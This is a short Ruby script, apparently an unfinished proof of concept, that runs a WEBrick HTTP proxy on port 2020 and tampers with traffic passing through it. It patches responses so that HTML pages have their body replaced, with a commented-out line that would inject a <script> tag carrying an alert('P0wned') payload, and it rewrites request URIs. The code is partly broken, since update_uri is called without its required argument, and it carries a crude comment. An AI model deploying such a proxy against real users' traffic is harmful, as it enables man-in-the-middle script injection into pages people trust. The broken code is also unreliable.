require 'webrick/httpproxy'

class WEBrick::HTTPRequest
  def  update_uri(uri)
    @unparsed_uri = uri
    @request_uri = parse_uri(uri)
  end
end

class WEBrick::HTTPResponse
  def  inject_payload(string)

    puts @content_type
    if @content_type =~ /html/
      puts "got up in this bitch!"
      @body = "asdf"
      #@body.gsub!( /<\/body>/ ,  "<script>#{string}</script></body>")  # this is just
    end
  end
end



req_call = Proc.new do |req,res| 
  req.update_uri()
  puts "#{req.unparsed_uri}"
end

res_call = Proc.new do |req,res| 
  res.inject_payload("alert(\"P0wned\");")
end


s = WEBrick::HTTPProxyServer.new(
  :Port => 2020,
  :RequestCallBack => req_call,
  :ProxyContentHandler => res_call
  #:RequestCallback => Proc.new{|req,res|
  #  #  puts "-"*70
  #    #  puts req.request_line, req.raw_header
  #      #  puts "-"*70
  #        #}
  )
  trap("INT"){ s.shutdown }
  s.start
